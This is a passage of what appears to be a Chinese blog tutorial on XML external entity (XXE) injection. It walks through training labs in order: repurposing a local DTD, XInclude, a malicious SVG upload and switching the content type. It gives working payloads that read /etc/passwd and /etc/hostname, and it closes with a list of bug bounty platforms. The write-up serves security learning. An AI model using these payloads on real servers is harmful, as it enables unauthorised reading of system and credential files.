&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"&gt;
&lt;!ENTITY % custom_entity '
&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
&amp;#x25;eval;
&amp;#x25;error;
'&gt;
%local_dtd;
]&gt;

此DTD执行以下步骤：
    1、定义名为的XML参数实体local_dtd，包含服务器文件系统上存在的外部DTD文件的内容。
    2、重新定义名为custom_entity，它已在外部DTD文件中定义。实体被重新定义为包含基于错误XXE攻击这已经描述过了，用于触发包含/etc/passwd文件。
    3、使用local_dtd，以便解释外部DTD，包括custom_entity实体。这将产生所需的错误消息。
</code></pre>
<hr/>
5、查找要重新使用的现有DTD文件
由于这种XXE攻击涉及到改变服务器文件系统上现有DTD的用途，因此关键的要求是找到合适的文件。这其实很简单。因为应用程序返回XML解析器抛出的任何错误消息，所以只需尝试从内部DTD中加载本地DTD文件，就可以轻松地枚举这些文件。
<pre><code>例如，使用GNOME桌面环境的Linux系统通常在/usr/share/yelp/dtd/docbookx.dtd中有一个DTD文件。可以通过提交以下XXE有效负载来测试此文件是否存在，如果文件丢失，则会导致错误：
&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
%local_dtd;
]&gt;</code></pre>
在测试了公用DTD文件列表以定位存在的文件后，需要获取该文件的副本并对其进行审阅以查找可重定义的图元。由于许多包含DTD文件的常用系统都是开放源代码的，因此通常可以通过Internet搜索快速获得文件的副本
<hr/>
6、涉及实验：<br/> 实验9：利用XXE通过改变本地DTD的用途来检索数据


---


---


> 
<h3>实验9：利用XXE通过改变本地DTD的用途来检索数据</h3>
信息：
本实验有一个"Check stock"（检查库存）功能，该功能可以解析XML输入，但不显示结果。
解决实验：请触发包含/etc/passwd文件内容的错误消息。
需要引用服务器上现有的DTD文件，并从中重新定义实体
使用GNOME桌面环境的系统通常在/usr/share/yelp/dtd/docbookx.dtd有一个DTD，其中包含一个名为ISOamso的实体。
<hr/>
part1:
访问一个产品页面，点击“检查库存”，并在Burp Suite中拦截由此产生的POST请求。

<hr/>
part2: 
XXE注入<br/>  
<pre><code>在XML声明和stockCheck元素之间插入以下参数实体定义：
&lt;!DOCTYPE message [
&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
&lt;!ENTITY % ISOamso '
&lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
&amp;#x25;eval;
&amp;#x25;error;
'&gt;
%local_dtd;
]&gt;</code></pre>
这将导入Yelp DTD，然后重新定义ISOamso实体，触发包含/etc/passwd文件内容的错误消息

 <img alt="" height="414" src="https://img-blog.csdnimg.cn/a5b576880630459195bddec1463577fb.png" width="1200"/>



---


<br/>  

---


---


## 五、查找XXE注入的隐藏攻击面

> 
<h3>1、简述：</h3>
XXE注入漏洞的攻击面在许多情况下是显而易见的，因为应用程序的正常HTTP通信量包括含有XML格式数据的请求。在其他情况下，攻击面不太明显。但如果在正确的地方查看，会发现XXE攻击出现在不包含任何XML的请求中


> 
<h3>2、XInclude攻击</h3>
1、一些应用程序接收客户端提交的数据，在服务器端将其嵌入到XML文档中，然后解析该文档。当客户端提交的数据被放入后端SOAP请求中，然后由后端SOAP服务处理时，就会出现这种情况。
<hr/>
2、在这种情况下，不能执行典型的XXE攻击，因为不能控制整个XML文档，因此不能定义或修改文件DOCTYPE元素。但也许可以使用XInclude替代。XInclude是XML规范的一部分，它允许从子文档构建XML文档。可以放置一个XInclude XML文档中的任何数据值内的攻击，因此在仅控制放置在服务器端XML文档中的单个数据项的情况下可以执行攻击
<hr/>
3、要执行 XInclude 攻击，需要引用 XInclude 命名空间并提供希望包含的文件的路径。
<pre><code>例如：
&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;</code></pre>
<hr/>
4、涉及实验：<br/> 实验7：利用XInclude检索文件


---


> 
<h3>实验7：利用XInclude检索文件</h3>
信息：
1、本实验有一个“Check stock”特性，它将用户输入嵌入到服务器端XML文档中，然后解析该文档。
2、因为不能控制整个XML文档，所以不能定义DTD来发起典型的XXE攻击。
3、完成实验：插入XInclude语句以检索/etc/passwd文件的内容。
4、默认情况下，XInclude会尝试将包含的文档解析为XML。由于/etc/passwd不是有效的XML，因此需要向XInclude指令添加一个额外的属性来更改此行为。
<hr/>
part1:
访问一个产品页面，点击"检查库存"，并在Burp Suite中拦截由此产生的POST请求，并发送到repeater


<hr/>
part2：
XXE注入
将productId参数的值设置为（storeid的参数测试行不通）
<pre>`&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;`</pre>

 <img alt="" height="405" src="https://img-blog.csdnimg.cn/8ca984b9e0d949bfb43f0e93f1045848.png" width="1200"/>



---


> 
<h3>3、通过文件上传进行XXE攻击</h3>
1、一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用XML或包含XML子组件。基于XML的格式的例子有DOCX这样的办公文档格式和SVG这样的图像格式。
<hr/>
2、如应用程序可能允许用户上载图像，并在上载后在服务器上处理或验证这些图像。即使应用程序希望接收PNG或JPEG之类的格式，所使用的图像处理库也可能支持SVG图像。由于SVG格式使用XML，攻击者可以提交恶意SVG图像，从而到达XXE漏洞的隐藏攻击面。 
<hr/>
3、涉及实验：<br/> 实验8：通过图像文件上传利用XXE


---


> 
<h3>实验8：通过图像文件上传利用XXE</h3>
信息：
本实验允许用户将头像附加到评论中，并使用Apache Batik库处理头像图像文件。
完成实验：上载一个映像，其中显示处理后的/etc/hostname文件的内容。然后使用“Submit solution”按钮提交服务器主机名的值。
<hr/>
part1:
创建包含以下内容的本地SVG图像：
<pre>`&lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt; ]&gt;&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;&lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;`</pre>

<hr/>
part2: 
在博客文章上发表评论，并将此图像作为头像上传

<img alt="" height="510" src="https://img-blog.csdnimg.cn/1105fe42fc5a4057a6a9497a999fae1f.png" width="1200"/><br/> 当查看评论时，应该会在映像中看到/etc/hostname文件的内容
 <img alt="" height="677" src="https://img-blog.csdnimg.cn/ce82b62d04b342e7a32433c9804b9835.png" width="1200"/>
<pre>`cbc1b53c3df7`</pre>


使用“Submit solution”按钮提交服务器主机名的值<br/><img alt="" height="698" src="https://img-blog.csdnimg.cn/ba15292969c449c2a6e5c9baf44f0d2e.png" width="1105"/>



---


> 
<h3>4、通过修改内容类型的XXE攻击</h3>
1、大多数POST请求使用由HTML表单生成的默认内容类型，例如application/x-www-form-urlencoded。有些网站希望接收这种格式的请求，但也会容忍其他内容类型，包括XML。
<pre><code>例如，如果正常请求包含以下内容：
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar</code></pre>
<pre><code>然后，可以提交以下请求，得到相同的结果：
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;foo&gt;bar&lt;/foo&gt;</code></pre>
如果应用程序允许在消息正文中包含XML的请求，并将正文内容解析为XML，那么只需将请求重新格式化为使用XML格式，就可以到达隐藏的XXE攻击面。 


---


---


## 六、查找和测试XXE漏洞

> 
<h3>1、简述：</h3>
1、绝大多数XXE漏洞都可以使用Burp Suite的Web漏洞扫描程序
<pre><code>XXE漏洞的手动测试通常包括：
    1、检测档桉检索方法是基于众所周知的操作系统文件定义外部实体，并在应用程序响应中返回的数据中使用该实体。
    2、检测盲目XXE漏洞方法是基于您控制的系统的URL定义外部实体，并监视与该系统的交互。Burp Collaborator客户端非常适合这个用途。
    3、测试服务器端XML文档中是否存在用户提供的非XML数据的漏洞XInclude攻击尝试检索已知的操作系统文件</code></pre>
2、XML只是一种数据传输格式。确保您还测试了任何基于XML的功能的其他漏洞，如XSS和SQL注入。您可能需要使用XML转义序列对有效负载进行编码，以避免破坏语法，但您也可以使用此序列来混淆攻击，以绕过薄弱的防御。


---


---


<img alt="" src="https://img-blog.csdnimg.cn/7d62be979184459ab44139ed85f387fe.png"/>​

> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>​网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>​First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>​目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>​second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>​目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[看雪渗透测试服务](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>​Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>​目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>​second year 

---

